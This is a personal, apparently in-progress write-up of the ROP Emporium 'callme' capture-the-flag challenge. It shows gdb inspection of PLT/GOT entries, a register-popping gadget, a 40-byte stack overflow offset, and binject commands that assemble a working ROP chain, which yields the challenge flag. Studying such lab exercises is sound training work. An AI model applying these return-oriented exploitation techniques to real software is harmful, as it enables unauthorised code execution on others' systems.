# callme challenge

Coming back to https://ropemporium.com/challenge/callme.html.

## Blind test

1. wget https://ropemporium.com/binary/callme.zip (*to download the challenge*)
2. unzip callme.zip (*to unzip the challenge*)
3. checksec callme (*to check for security features*)
4. rabin2 -z callme (*to check for usefull strings*)

5. gdb callme
	1. info function give use some functions:
		- pwnme (the vulnerable function from *ret2win*).
		- usefulFunction (that, at disasemblying, call all the other three functions)
		- callme_one/two/three with the @plt label

Challenge talk about "incorrect calls" to theses functions that are not supposed to be used. I wanted to ROP this function to ensure PLT to resolve related symbols, but... well, let's try the "conventional way" first. <br>
**TODO**

The conventional is to jump to the **.plt** section (with offset) to resolve thoses functions. Then, we could easily ROP to *@got.plt* to simply call thoses functions;

Still with gdb:
1. info files (to retrieve **.got.plt** section):
2. x/20i 0x00000000004006c0 (with *.plt* section start address)
3. At this point, symbols are not already resolved, but at least we can identify the address on **.plt** section to jump on for each function with related **@got.plt** addresses as:
- 0x400720 <callme_one@plt>:   jmp    *0x20091a(%rip)        # 0x601040 <callme_one@got.plt>
- 0x400740 <callme_two@plt>:   jmp    *0x20090a(%rip)        # 0x601050 <callme_two@got.plt>
- 0x4006f0 <callme_three@plt>: jmp    *0x200932(%rip)        # 0x601028 <callme_three@got.plt>

Also, thoses functions needs 3 arguments (as we can see at disasembling *usefulFunction*) loaded onto RDI, RSI and RDX registers; a ROP gadget poping stack to thoses registers would allow us to perform the call. Where is that gadget? In the *usefulGadget* maybe?
> 0x000000000040093c <+0>:&emsp;	pop    %rdi&emsp;	// for 0xdeadbeefdeadbeef <br>
> 0x000000000040093d <+1>:&emsp;    pop    %rsi&emsp; 	// for 0xcafebabecafebabe <br>
> 0x000000000040093e <+2>:&emsp;	pop    %rdx&emsp; 	// for 0xd00df00dd00df00d <br>
> 0x000000000040093f <+3>:&emsp;	ret

With that, there is litterally no needs to use **ropper**. In addition to this, the emporium statement gives us valuable information about the parameters; on x64 architecture, it shall be 128 bytes long. 
**TODO WHYYYY!?**

Let's first verify that's the **pwnme** is still 32 bytes long with the **BB** test:
> binject -ns 32 A -x BBBBBBBBBBBBBBBB > test <br>
> tgdb callme <br>
> break *(pwnme+89) // to put a breakpoint at pwnme+89, as the ret instruction <br>
> r < test

We can see that the RBP register value is 0xbbbbbbbbbbbbbbbb, great. Let's then try to reach the <callme_one@plt>:
> binject -ns 40 A -x 200740 > test <br>
> tgdb callme <br>
> break *0x400720&emsp;//the adress of \<callme_one@plt> from **.plt** section <br>
> continue

I am going to append some changes to the binject project as to:
- allow lowercases letters in case of hexadecimal flag parameter.
- new -u64 flag to append 64-bits unsigned integer (with an hypotetical 0x prefix), litte-endian is assumed and padding appended if necessary.
- new -of flag to generate output onto a file. 
- new -if flag to append content from a file generated by binject.

Changes have been push to the [repository](https://github.com/anarticho/binject).

## Testing
In order to make the work on "binject" project faster, i want to automatize some tests to be informed at changing the code. It shall be easily performed through two uniques tests as:
- for basic format flags (-s, -x, -ns, -nx) and file output (-of).
- for file flag, using (-if) and standart output, redirected to a text file to test.

## The solution

Let's coming back to the challenge. Now we have a pretty nice tool with binject, we can just create some binaries to play with. To do so:
1. Create the binary to overflow the vulnerable buffer:
> binject -of ovf.bin -ns 40 A
2. Create the binary to contain the ROP gadget and the arguments:
> binject -of arg.bin -x64 40093c -x64 deadbeefdeadbeef -x64 cafebabecafebabe -x64 d00df00dd00df00d
3. Then create binaries to jump on each callme function from **.plt**:
> binject -of cm1.bin -if arg.bin -x64 400720 <br>
> binject -of cm2.bin -if arg.bin -x64 400740 <br>
> binject -of cm3.bin -if arg.bin -x64 4006f0 <br>
4. Put it all together.
> binject -of ola.bin -if ovf.bin -if cm1.bin -if cm2.bin -if cm3.bin

In fact, i putted it all into an *.sh* script in order not to have to type each time. 

Let's goooooo:
> ./callme < bin/ola.bin <br>
> callme by ROP Emporium <br>
> x86_64 <br>
> <br>
> Hope you read the instructions... <br>
> <br>
> Thank you! <br>
> callme_one() called correctly <br>
> callme_two() called correctly <br>
> ROPE{a_placeholder_32byte_flag!} <br>
